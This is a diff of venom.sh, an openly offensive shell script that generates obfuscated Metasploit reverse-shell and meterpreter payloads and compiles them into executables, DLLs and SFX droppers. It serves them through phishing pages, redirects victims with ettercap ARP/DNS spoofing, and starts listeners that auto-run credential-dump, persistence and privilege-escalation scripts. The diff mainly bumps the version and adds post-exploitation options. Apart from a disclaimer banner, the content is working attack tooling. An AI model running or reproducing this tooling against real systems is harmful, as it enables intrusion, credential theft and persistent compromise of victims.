@@ -1,9 +1,9 @@
 #!/bin/sh
 # --------------------------------------------------------------
 # venom - metasploit Shellcode generator/compiler/listenner
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.12
-# Suspicious-Shell-Activity (SSA) RedTeam develop @2016
-# codename: black_mamba [ GPL licensed ]
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.13
+# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
+# codename: the Minotaur [ GPL licensed ]
 # --------------------------------------------------------------
 # [DEPENDENCIES]
 # "venom.sh will download/install all dependencies as they are needed"
@@ -14,8 +14,9 @@
 # --------------------------------------------------------------
 # Resize terminal windows size befor running the tool (gnome terminal)
 # Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
-resize -s 38 89 > /dev/null
+resize -s 40 89 > /dev/null
 # inicio
+
 
 
 
@@ -24,8 +25,8 @@ resize -s 38 89 > /dev/null
 # check if user is root
 # ---------------------
 if [ $(id -u) != "0" ]; then
-echo "[☠ ] we need to be root to run this script..."
-echo "[☠ ] execute [ sudo ./venom.sh ] on terminal"
+echo "[☠] we need to be root to run this script..."
+echo "[☠] execute [ sudo ./venom.sh ] on terminal"
 exit
 else
 echo "root user" > /dev/null 2>&1
@@ -40,11 +41,12 @@ fi
 # ----------------------
 OS=`uname` # grab OS
 H0m3=`echo ~` # grab home path
-ver="1.0.12" # script version display
-C0d3="Black mamba" # version codename display
+ver="1.0.13" # script version display
+C0d3="the Minotaur" # version codename display
 user=`who | cut -d' ' -f1 | sort | uniq` # grab username
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
 IPATH=`pwd` # grab venom.sh install path (home/username/shell)
+mSf=`locate modules/post/windows/escalate | egrep -m 1 "post"` # grab msf post folder path
 # ------------------------------------------------------------------------
 # funtions [templates] to be injected with shellcode
 # ------------------------------------------------------------------------
@@ -65,7 +67,7 @@ InJEc12="$IPATH/templates/phishing/mega.html" # fake webpage script path
 InJEc13="$IPATH/templates/phishing/driveBy.html" # fake webpage script path
 InJEc14="$IPATH/templates/hta_attack/index.html" # fake webpage script path
 InJEc15="$IPATH/templates/exec_psh.c" # c script path
-InJEc16="$IPATH/templates/exec.jar" # jat script path
+InJEc16="$IPATH/templates/exec.jar" # jar script path
 
 
 
@@ -140,30 +142,29 @@ clear
 # ------------------------------------
 cat << !
 
-            __    _ ______  ____   _  _____  ____    __  
-           \  \  //|   ___||    \ | |/     \|    \  /  |
-            \  \// |   ___||     \| ||     ||     \/   |
-             \__/  |______||__/\____|\_____/|__/\__/|__|
-               |S|h|e|l|l|c|0|d|e| |G|e|n|e|r|a|t|0|r|
-                      - CodeName: $C0d3 -
-
+               __    _ ______  ____   _  _____  ____    __  
+              \  \  //|   ___||    \ | |/     \|    \  /  |
+               \  \// |   ___||     \| ||     ||     \/   |
+                \__/  |______||__/\____|\_____/|__/\__/|__|
+                  |S|h|e|l|l|c|0|d|e| |G|e|n|e|r|a|t|0|r|
+                         - CodeName: $C0d3 -
 !
-echo "---"
-echo "-- The author does not hold any responsibility for the bad use"
-echo "-- of this tool, remember that attacking targets without prior"
-echo "-- consent is illegal and punished by law."
-echo "--"
-echo "-- The main goal of this tool its not to build 'FUD' payloads!..."
-echo "-- But to give to its users the first glance of how shellcode is"
-echo "-- build, embedded into one template (any language), obfuscated"
-echo "-- (e.g pyherion.py) and compiled into one executable file."
-echo "-- 'reproducing technics found in Veil,Unicorn,powersploit'" 
-echo "--"
-echo "-- Author:r00t-3xp10it | Suspicious Shell Activity (Red Team)"
-echo "-- VERSION:$ver USER:$user INTERFACE:$InT3R DISTRO:$DiStR0"
-echo "---"
+echo "    ╔────────────────────────────────────────────────────────────────╗"
+echo "    |  The author does not hold any responsibility for the bad use   |"
+echo "    |  of this tool, remember that attacking targets without prior   |"
+echo "    |  consent is illegal and punished by law.                       |"
+echo "    |                                                                |"
+echo "    |  The main goal of this tool its not to build 'FUD' payloads!   |"
+echo "    |  But to give to its users the first glance of how shellcode is |"
+echo "    |  build, embedded into one template (any language), obfuscated  |"
+echo "    |  (e.g pyherion.py) and compiled into one executable file.      |"
+echo "    |  'reproducing technics found in Veil,Unicorn,powersploit'      |"
+echo "    ╠────────────────────────────────────────────────────────────────╝"
+echo "    | Author:r00t-3xp10it | Suspicious Shell Activity (RedTeam)"
+echo "    ╘ VERSION:$ver USER:$user INTERFACE:$InT3R DISTRO:$DiStR0"
+echo "" && echo ""
 sleep 2
-echo "[☠ ] Press [ENTER] to continue ..."
+echo "[☠] Press [ENTER] to continue ..."
 read op
 clear
 
@@ -179,8 +180,8 @@ if [ "$?" -eq "0" ]; then
 echo "msfconsole found" > /dev/null 2>&1
 else
 echo ""
-echo "[☠ ] msfconsole -> not found!"
-echo "[☠ ] This script requires msfconsole to work!"
+echo "[☠] msfconsole -> not found!"
+echo "[☠] This script requires msfconsole to work!"
 sleep 2
 exit
 fi
@@ -191,12 +192,12 @@ if [ "$?" -eq "0" ]; then
 echo "apache2 found" > /dev/null 2>&1
 else
 echo ""
-echo "[☠ ] apache2 -> not found!"
-echo "[☠ ] This script requires apache2 to work!"
+echo "[☠] apache2 -> not found!"
+echo "[☠] This script requires apache2 to work!"
 sleep 2
 echo ""
-echo "[☠ ] Please run: cd aux && sudo ./setup.sh"
-echo "[☠ ] to install all missing dependencies..."
+echo "[☠] Please run: cd aux && sudo ./setup.sh"
+echo "[☠] to install all missing dependencies..."
 exit
 fi
 
@@ -209,9 +210,9 @@ fi
 # ----------------------------------
 trap ctrl_c INT
 ctrl_c() {
-echo "[☠ ] CTRL+C PRESSED -> ABORTING TASKS!"
+echo "[☠] CTRL+C PRESSED -> ABORTING TASKS!"
 sleep 1
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 # just in case :D !!!
 # revert [templates] backup files to default stages
 mv $IPATH/templates/exec[bak].c $InJEc > /dev/null 2>&1
@@ -230,6 +231,8 @@ mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /d
 mv $IPATH/templates/evil_pdf/PDF-encoder[bak].py PDF-encoder.py > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
+mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
+mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
 # delete temp generated files
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/templates/trigger.raw > /dev/null 2>&1
@@ -255,13 +258,14 @@ rm $ApAcHe/*.apk > /dev/null 2>&1
 rm $ApAcHe/*.exe > /dev/null 2>&1
 rm $ApAcHe/*.py > /dev/null 2>&1
 rm $ApAcHe/*.bat > /dev/null 2>&1
+rm $ApAcHe/*.deb > /dev/null 2>&1
 # delete pyinstaller temp files
 rm $IPATH/*.spec > /dev/null 2>&1
 rm -r $IPATH/dist > /dev/null 2>&1
 rm -r $IPATH/build > /dev/null 2>&1
 # exit venom.sh
-echo "[☠ ] Exit Shellcode Generator..."
-echo "[_Codename:black_mamba]"
+echo "[☠] Exit Shellcode Generator..."
+echo "[_Codename:$C0d3]"
 echo "☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆"
 sleep 1
 if [ "$DiStR0" = "Kali" ]; then
@@ -293,7 +297,8 @@ else
 fi
 clear
 
-# -----------END OF SCRIPT SETTINGS------------>
+
+# -------------------------------------------------END OF SCRIPT SETTINGS------------------------------------->
 
 
 
@@ -308,7 +313,7 @@ clear
 # ---------------------------------------------
 sh_shellcode1 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 
@@ -316,7 +321,7 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "osx/x64/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "bsd/x64/shell_reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 380) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> C format ..."
+echo "[☠] Building shellcode -> C format ..."
 echo "" > $IPATH/output/chars.raw
 # display final settings to user
 cat << !
@@ -343,34 +348,34 @@ sleep 2
    # chars.raw | exec.c | gcc compiler
    # check if template exists
    if [ -e $InJEc ]; then
-      echo "[☠ ] exec.c -> found!"
+      echo "[☠] exec.c -> found!"
       sleep 2
    else
-      echo "[☠ ] exec.c -> not found!"
+      echo "[☠] exec.c -> not found!"
       exit
    fi
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
    # check if gcc exists
    c0m=`which gcc`> /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
-      echo "[☠ ] gcc compiler -> found!"
+      echo "[☠] gcc compiler -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] gcc compiler -> not found!"
-      echo "[☠ ] Download compiler -> apt-get install gcc"
+      echo "[☠] gcc compiler -> not found!"
+      echo "[☠] Download compiler -> apt-get install gcc"
       echo ""
       sudo apt-get install gcc
       echo ""
@@ -379,7 +384,7 @@ sleep 2
 
 # EDITING/BACKUP FILES NEEDED
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc $IPATH/templates/exec[bak].c
 
    # edit exec.c using leafpad or gedit editor
@@ -391,7 +396,7 @@ cp $InJEc $IPATH/templates/exec[bak].c
 
 cd $IPATH/templates
 # COMPILING SHELLCODE USING GCC
-echo "[☠ ] Compiling using gcc..."
+echo "[☠] Compiling using gcc..."
 gcc -fno-stack-protector -z execstack exec.c -o $N4m
 mv $N4m $IPATH/output/$N4m
 
@@ -400,15 +405,16 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
 
    else
 
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "post_linux.rc" FALSE "post_multi.rc" --width 350 --height 230) > /dev/null 2>&1
 
       # edit files nedded
       cd $IPATH/templates/phishing
@@ -418,7 +424,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
       # copy from output
       cd $IPATH/output
       cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -427,29 +433,31 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         sed "s|NaM3|$N4m|" $IPATH/templates/phishing/index2.html > $D3F/index.html
         cp $IPATH/output/$N4m $D3F/$N4m
         echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
 
         echo "- ATTACK VECTOR: http://$lhost"
+        echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
    fi
 
 
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/exec[bak].c $InJEc
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m > /dev/null 2>&1
@@ -473,14 +481,14 @@ cd $IPATH/
 # -----------------------------------------------------------------
 sh_shellcode2 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> C format ..."
+echo "[☠] Building shellcode -> C format ..."
 echo "" > $IPATH/output/chars.raw
 # display final settings to user
 cat << !
@@ -506,34 +514,34 @@ sleep 2
    # check if all dependencies needed are installed
    # check if template exists
    if [ -e $InJEc5 ]; then
-      echo "[☠ ] exec_dll.c -> found!"
+      echo "[☠] exec_dll.c -> found!"
       sleep 2
    else
-      echo "[☠ ] exec_dll.c -> not found!"
+      echo "[☠] exec_dll.c -> not found!"
       exit
    fi
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
    # check if mingw32 exists
    c0m=`which i586-mingw32msvc-gcc`> /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
-      echo "[☠ ] mingw32 compiler -> found!"
+      echo "[☠] mingw32 compiler -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] mingw32 compiler -> not found!"
-      echo "[☠ ] Download compiler -> apt-get install mingw32"
+      echo "[☠] mingw32 compiler -> not found!"
+      echo "[☠] Download compiler -> apt-get install mingw32"
       echo ""
       sudo apt-get install mingw32
       echo ""
@@ -542,13 +550,13 @@ sleep 2
 
 # EDITING/BACKUP FILES NEEDED
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc5 $IPATH/templates/exec_dll[bak].c
 cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
 
 cd $IPATH/templates
 # use SED to replace IpADr3 and P0rT
-echo "[☠ ] Injecting shellcode -> $N4m.dll!"
+echo "[☠] Injecting shellcode -> $N4m.dll!"
 sleep 2
 sed "s|IpADr3|$lhost|g" exec_dll.c > copy.c
 sed "s|P0rT|$lport|g" copy.c > copy2.c
@@ -556,7 +564,7 @@ mv copy2.c exec_dll.c
 rm copy.c
 
 # build winrar-SFX trigger.bat script
-echo "[☠ ] Building winrar/SFX -> trigger.bat..."
+echo "[☠] Building winrar/SFX -> trigger.bat..."
 sleep 2
 echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/trigger.bat
 echo ":: this script will run payload using rundll32" >> $IPATH/output/trigger.bat
@@ -568,7 +576,7 @@ echo "exit" >> $IPATH/output/trigger.bat
 sleep 2
 
 # COMPILING SHELLCODE USING mingw32
-echo "[☠ ] Compiling/obfuscating using mingw32..."
+echo "[☠] Compiling/obfuscating using mingw32..."
 sleep 2
 # special thanks to astr0baby for mingw32 -mwindows flag :D
 i586-mingw32msvc-gcc exec_dll.c -o $N4m.dll -lws2_32 -shared -mwindows
@@ -582,9 +590,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
@@ -594,7 +602,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
       # user settings
       N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with trigger.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" --width 350 --height 260) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "post_multi.rc" --width 350 --height 300) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start trigger.bat on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -629,7 +637,7 @@ fi
       cp copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -641,9 +649,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -652,9 +660,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
@@ -662,7 +670,7 @@ fi
 
 
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/templates/exec_dll[bak].c $InJEc5 > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
@@ -693,7 +701,7 @@ cd $IPATH/
 # -------------------------------------------------
 sh_shellcode3 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 N4m=$(zenity --title="☠ DLL NAME ☠" --text "example: shellcode" --entry --width 330) > /dev/null 2>&1
@@ -701,7 +709,7 @@ N4m=$(zenity --title="☠ DLL NAME ☠" --text "example: shellcode" --entry --wi
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> dll format ..."
+echo "[☠] Building shellcode -> dll format ..."
 # display final settings to user
 cat << !
 
@@ -718,14 +726,14 @@ cat << !
 # new obfuscating method
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f dll > $IPATH/output/$N4m.dll"
 echo ""
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
 
 
-echo "[☠ ] Injecting shellcode -> $N4m.dll!"
+echo "[☠] Injecting shellcode -> $N4m.dll!"
 sleep 2
 # build winrar-SFX trigger.bat script
-echo "[☠ ] Building winrar/SFX -> trigger.bat..."
+echo "[☠] Building winrar/SFX -> trigger.bat..."
 sleep 2
 echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/trigger.bat
 echo ":: this script will run payload using rundll32" >> $IPATH/output/trigger.bat
@@ -742,9 +750,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
@@ -753,7 +761,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
 
       N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with trigger.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" --width 350 --height 260) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "post_multi.rc" --width 350 --height 290) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start trigger.bat on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -789,7 +797,7 @@ fi
       cp copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -801,9 +809,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -812,9 +820,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
